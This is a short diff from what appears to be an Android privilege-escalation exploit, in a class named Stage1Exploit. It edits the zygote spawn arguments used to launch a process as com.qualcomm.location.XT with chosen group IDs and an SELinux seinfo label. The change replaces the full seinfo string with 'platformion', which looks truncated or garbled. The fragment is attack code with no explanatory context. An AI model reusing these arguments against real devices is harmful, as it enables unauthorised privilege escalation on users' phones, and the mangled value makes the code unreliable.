@@ -191,7 +191,7 @@ class Stage1Exploit:
             "--setgid=1000",
             "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=platform:isPrivApp:location_app:targetSdkVersion=28:complete",
+            "--seinfo=platformion",
             "--nice-name=com.qualcomm.location.XT",
             "--app-data-dir=/data/data/com.qualcomm.location.XT",
             "--runtime-flags=1",
